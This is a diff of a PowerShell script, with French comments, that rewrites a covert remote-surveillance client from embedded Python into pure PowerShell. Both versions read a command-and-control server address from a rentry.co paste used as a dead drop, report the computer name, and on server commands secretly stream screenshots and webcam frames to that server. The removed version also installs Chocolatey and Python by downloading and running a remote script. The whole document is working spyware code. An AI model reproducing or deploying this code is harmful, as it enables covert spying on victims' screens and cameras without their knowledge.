@@ -1,150 +1,316 @@
-# Vérifier si Python 3 ou ultérieur est installé
-$pythonExists = $false
-$pythonCommand = ""
-try {
-    $pythonVersionOutput = (python -V 2>&1) -replace "Python ", ""
-    if ($pythonVersionOutput -match "^3\..+") {
-        $pythonExists = $true
-        $pythonCommand = "python"
-    }
-} catch {}
 
-if (-not $pythonExists) {
+$Headers = @{
+    "Referer" = "https://rentry.co/"
+}
+
+
+function Invoke-Request {
+    param(
+        [string]$url,
+        [string]$method,
+        [hashtable]$headers,
+        [hashtable]$body
+    )
+
+    $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
+    $response = Invoke-WebRequest -Uri $url -Method $method -Headers $headers -Body $body -WebSession $session
+    return $response
+}
+
+
+
+function Get-Raw {
+    param(
+        [string]$url
+    )
+
+    $rawUrl = "https://rentry.co/api/raw/$url"
+    $response = Invoke-Request -url $rawUrl -method "GET" -headers $Headers
+    return (ConvertFrom-Json $response.Content)
+}
+
+
+#-----------------------------
+
+#Install-Module -Name ThreadJob -RequiredVersion 2.0.0 -force
+
+Add-Type -TypeDefinition @"
+    using System;
+    using System.IO;
+    using System.Drawing;
+    using System.Windows.Forms;
+    using System.Drawing.Imaging;
+    using System.Runtime.InteropServices;
+    
+    public class ScreenCapture
+    {
+        public byte[] CaptureScreen()
+        {
+            using (var stream = new MemoryStream())
+            {
+                Rectangle bounds = Screen.GetBounds(Point.Empty);
+                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
+                {
+                    using (Graphics g = Graphics.FromImage(bitmap))
+                    {
+                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+                    }
+                    bitmap.Save(stream, ImageFormat.Jpeg);
+                }
+                return stream.ToArray();
+            }
+        }
+    }
+
+    public class CameraCapture
+    {
+        private const short WM_CAP = 0x400;
+        private const int WM_CAP_DRIVER_CONNECT = 0x40a;
+        private const int WM_CAP_DRIVER_DISCONNECT = 0x40b;
+        private const int WM_CAP_EDIT_COPY = 0x41e;
+
+        [DllImport("avicap32.dll")]
+        protected static extern int capCreateCaptureWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindowName,
+            int dwStyle, int x, int y, int nWidth, int nHeight, int hWndParent, int nID);
+
+        [DllImport("user32", EntryPoint = "SendMessageA")]
+        protected static extern int SendMessage(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.AsAny)] object lParam);
+
+        [DllImport("user32")]
+        protected static extern bool DestroyWindow(int hwnd);
+
+        private int _deviceIndex;
+        private int _deviceHandle;
+
+        public CameraCapture(int deviceIndex)
+        {
+            _deviceIndex = deviceIndex;
+        }
+
+        public static CameraCapture Create(int deviceIndex)
+        {
+            return new CameraCapture(deviceIndex);
+        }
+
+        public void Start()
+        {
+            string deviceIndexString = Convert.ToString(_deviceIndex);
+            _deviceHandle = capCreateCaptureWindowA(ref deviceIndexString, 0, 0, 0, 0, 0, 0, 0);
+
+            if (SendMessage(_deviceHandle, WM_CAP_DRIVER_CONNECT, _deviceIndex, 0) > 0)
+            {
+                SendMessage(_deviceHandle, WM_CAP_EDIT_COPY, 0, 0);
+            }
+        }
+
+        public void Stop()
+        {
+            SendMessage(_deviceHandle, WM_CAP_DRIVER_DISCONNECT, _deviceIndex, 0);
+            DestroyWindow(_deviceHandle);
+        }
+
+        public Bitmap GetFrame()
+        {
+            IDataObject data = Clipboard.GetDataObject();
+            if (data.GetDataPresent(typeof(Bitmap)))
+            {
+                return (Bitmap)data.GetData(typeof(Bitmap));
+            }
+            return null;
+        }
+    }
+
+"@ -ReferencedAssemblies "System.Windows.Forms", "System.Drawing"
+
+
+function Send-Image {
+    param(
+        [string]$endmsg,
+        [System.Net.WebSockets.ClientWebSocket]$webSocket,
+        [string]$base64Image
+    )
+
+    $bufferSize = 4096
+    $offset = 0
+    $stringLength = $base64Image.Length
+
+    while ($offset -lt $stringLength) {
+        $remainingLength = $stringLength - $offset
+        $lengthToSend = [Math]::Min($bufferSize, $remainingLength)
+        $partialData = $base64Image.Substring($offset, $lengthToSend)
+        $buffer = [System.Text.Encoding]::UTF8.GetBytes($partialData)
+        $sendTask = $webSocket.SendAsync([System.ArraySegment[byte]]::new($buffer), [System.Net.WebSockets.WebSocketMessageType]::Text, $false, [System.Threading.CancellationToken]::None)
+        try {
+            $sendTask.Wait()
+        }catch [AggregateException] {
+            $_.Exception.InnerExceptions | ForEach-Object {
+                Write-Host $_.Message
+                if ($_.InnerException -ne $null) {
+                    Write-Host "InnerException: $($_.InnerException.Message)"
+                }
+            }
+            return
+        }
+
+        $offset += $lengthToSend
+    }
+
+    $endOfImageBuffer = [System.Text.Encoding]::UTF8.GetBytes($endmsg)
+    $sendTask = $webSocket.SendAsync([System.ArraySegment[byte]]::new($endOfImageBuffer), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None)
     try {
-        $pythonVersionOutput = (python3 -V 2>&1) -replace "Python ", ""
-        if ($pythonVersionOutput -match "^3\..+") {
-            $pythonExists = $true
-            $pythonCommand = "python3"
-        }
-    } catch {}
-}
-
-if (-not $pythonExists) {
-    # Vérifier si Chocolatey est installé
-    if (!(Get-Command choco -ErrorAction SilentlyContinue)) {
-        # Installer Chocolatey
-        Set-ExecutionPolicy Bypass -Scope Process -Force;
-        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072;
-        iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
-    }
-
-    # Installer Python avec Chocolatey
-    choco install python -y
-    $pythonExists = $true
-    $pythonCommand = "python"
-}
-
-if ($pythonExists) {
-    # Installer les bibliothèques requises
-    $requiredLibs = @("pyautogui", "pillow", "zstandard", "opencv-python", "urllib3")
-    $installedLibs = (& $pythonCommand -m pip list) -join " "
-
-    foreach ($lib in $requiredLibs) {
-        if (!($installedLibs.Contains($lib))) {
-            & $pythonCommand -m pip install $lib
+        $sendTask.Wait()
+    } catch [AggregateException] {
+        $_.Exception.InnerExceptions | ForEach-Object {
+            Write-Host $_.Message
         }
     }
 }
 
-$pythonCode = @"
-import socket
-import pyautogui
-from PIL import Image
-import io
-import zstandard as zstd
-import cv2
-import pickle
-import http.cookiejar
-import urllib.parse
-import urllib.request
-from json import loads as json_loads
+function Write-Log {
+    param(
+        [string]$Message,
+        [string]$LogFile = "debug.log"
+    )
 
-_headers = {'Referer': 'https://rentry.co'}
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    $logMessage = "$timestamp - $Message"
+    Add-Content -Path $LogFile -Value $logMessage
+}
 
 
-class UrllibClient:
+function Main {
 
-    def __init__(self):
-        self.cookie_jar = http.cookiejar.CookieJar()
-        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.cookie_jar))
-        urllib.request.install_opener(self.opener)
+    $rawData = Get-Raw "QZEOPJHOZgbuioebopmammazpodepfonzZEGnpazfoi71951uzebf55684651699985"
+    $ServerIP = $rawData.content
+    $Port = 8559
 
-    def get(self, url, headers={}):
-        request = urllib.request.Request(url, headers=headers)
-        return self._request(request)
-
-    def post(self, url, data=None, headers={}):
-        postdata = urllib.parse.urlencode(data).encode()
-        request = urllib.request.Request(url, postdata, headers)
-        return self._request(request)
-
-    def _request(self, request):
-        response = self.opener.open(request)
-        response.status_code = response.getcode()
-        response.data = response.read().decode('utf-8')
-        return response
+    $syncHash = [hashtable]::Synchronized(@{})
+    $job = $null
+    $jobcam = $null
 
 
-def raw(url):
-    client = UrllibClient()
-    return json_loads(client.get('https://rentry.co/api/raw/{}'.format(url)).data)
+    $webSocket = New-Object System.Net.WebSockets.ClientWebSocket
+    $cancellationToken = New-Object System.Threading.CancellationToken
+    $webSocket.Options.UseDefaultCredentials = $true
+    $StreamURI = "ws://${ServerIP}:${Port}"
+    $connection = $webSocket.ConnectAsync($StreamURI, $cancellationToken)
+    $connection.Wait()
 
-client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host = raw('QZEOPJHOZgbuioebopmammazpodepfonzZEGnpazfoi71951uzebf55684651699985')['content']
-port = 5844
-client.connect((host, port))
+    $recvBuffer = New-Object byte[] 1024
+    $recvSegment = [System.ArraySegment[byte]]::new($recvBuffer)
+    $recvResult = $webSocket.ReceiveAsync($recvSegment, $cancellationToken)
+    $recvResult.Wait()
 
-def capture_screen():
-    screen = pyautogui.screenshot()
-    screen.thumbnail((1920, 1080), Image.Resampling.LANCZOS) # Increased dimensions
-    with io.BytesIO() as output:
-        screen.save(output, format='JPEG', quality=95) # Increased quality
-        return output.getvalue()
+    $message = [System.Text.Encoding]::UTF8.GetString($recvBuffer, 0, $recvResult.Result.Count)
+    if ($message -eq "request_name") {
+        $name = $env:COMPUTERNAME
+        $sendBuffer = [System.Text.Encoding]::UTF8.GetBytes($name)
+        $sendSegment = [System.ArraySegment[byte]]::new($sendBuffer)
+        $sendResult = $webSocket.SendAsync($sendSegment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None)
+        $sendResult.Wait()
+    }
 
-def capture_webcam():
-    try:
-        ret, frame = cap.read()
-        frame = cv2.resize(frame, (1280, 720)) # Increased dimensions
-        return cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 95])[1].tobytes() # Increased quality
-    except:
-        print('Erreur lors de la capture de la webcam.')
-        return b''
-
-def send_image(image_data):
-    compressed_data = zstd.ZstdCompressor(level=1).compress(image_data)
-    pickled_data = pickle.dumps(compressed_data)
-    client.sendall(pickled_data)
-
-def receive():
-    while True:
-        try:
-            message = client.recv(1024).decode()
-            if message == 'CAPTURE_SCREEN':
-                image_data = capture_screen()
-                send_image(image_data)
-            elif message == 'CAPTURE_WEBCAM':
-                image_data = capture_webcam()
-                send_image(image_data)
-            elif message == 'KICK':
-                print('Le serveur vous a éjecté.')
-                client.close()
-                break
-        except:
-            print('Erreur de connexion.')
-            client.close()
+    while ($true) {
+        if ($webSocket.State -eq [System.Net.WebSockets.WebSocketState]::Aborted -or
+            $webSocket.State -eq [System.Net.WebSockets.WebSocketState]::Closed -or
+            $webSocket.State -eq [System.Net.WebSockets.WebSocketState]::CloseReceived) {
             break
+        }
 
-if __name__ == '__main__':
-    cap = cv2.VideoCapture(0)
-    try:
-        receive()
-    finally:
-        cap.release()
-        cv2.destroyAllWindows()
-"@
+        $recvBuffer = New-Object byte[] 1024
+        $recvSegment = [System.ArraySegment[byte]]::new($recvBuffer)
+        $recvResult = $webSocket.ReceiveAsync($recvSegment, $cancellationToken)
+        $recvResult.Wait()
 
-if (Get-Command python3 -ErrorAction SilentlyContinue) {
-    python3 -c $pythonCode
-} else {
-    python -c $pythonCode
+        $message = [System.Text.Encoding]::UTF8.GetString($recvBuffer, 0, $recvResult.Result.Count)
+        if ($message -eq "start_screen_sharing") {
+            $syncHash.continueSharing = $true
+            $def = ${function:Send-Image}
+
+            $scriptBlock = {
+                param(
+                    $syncHash,
+                    [System.Net.WebSockets.ClientWebSocket]$webSocket
+                )
+                   
+                ${function:Send-Image} = $using:def
+
+                $screenCapture = New-Object ScreenCapture
+
+                while ($syncHash.continueSharing) {
+                    $imageData = $screenCapture.CaptureScreen()
+                    $base64Image = [Convert]::ToBase64String($imageData)
+                    Send-Image -endmsg "END_OF_IMAGE" -webSocket $webSocket -base64Image $base64Image
+
+                    Start-Sleep -Milliseconds 33
+                }
+                return
+
+            } 
+
+            $job = Start-ThreadJob -ScriptBlock $scriptBlock -ArgumentList $syncHash, $webSocket 
+
+        } elseif ($message -eq "stop_screen_sharing") {
+           
+            $syncHash.continueSharing = $false
+            
+        } elseif ($message -eq "start_camera_sharing") {
+            $syncHash.continueSharingCam = $true
+            #$defCam = ${function:Send-Image}
+
+            
+
+            #$scriptBlockCam = {
+            #    param(
+            #        $syncHash,
+            #        [System.Net.WebSockets.ClientWebSocket]$webSocket
+            #    )
+
+            #    ${function:Send-Image} = $using:defCam
+
+            $cameraCapture = [CameraCapture]::Create(0)
+
+            $cameraCapture.Start()
+            #while ($syncHash.continueSharingCam) {
+            $frame = $cameraCapture.GetFrame()
+
+            if ($frame -ne $null) {
+                $syncHash.continueSharingCam = $true
+                $imageData = [System.IO.MemoryStream]::new()
+                $frame.Save($imageData, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+
+
+                $base64Image = [Convert]::ToBase64String($imageData.ToArray())
+                Send-Image -endmsg "END_OF_IMAGE_CAM" -webSocket $webSocket -base64Image $base64Image
+            }
+
+            Start-Sleep -Milliseconds 33
+
+                #}
+            $cameraCapture.Stop()
+
+                #return
+            #}
+
+            #$jobcam = Start-ThreadJob -ScriptBlock $scriptBlockCam -ArgumentList $syncHash, $webSocket
+
+            
+        } elseif ($message -eq "stop_camera_sharing") {
+           
+            $syncHash.continueSharingCam = $false
+            
+        } elseif ($message -eq "kick") {
+            $syncHash.continueSharing = $false
+            $syncHash.continueSharingCam = $false
+
+            Get-Job | Remove-Job -Force
+            $webSocket.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Kicked by server", $cancellationToken).Wait()
+            break
+        }
+
+        Start-Sleep -Milliseconds 100
+    }
+    Get-Job | Remove-Job -Force
 }
+
+Main
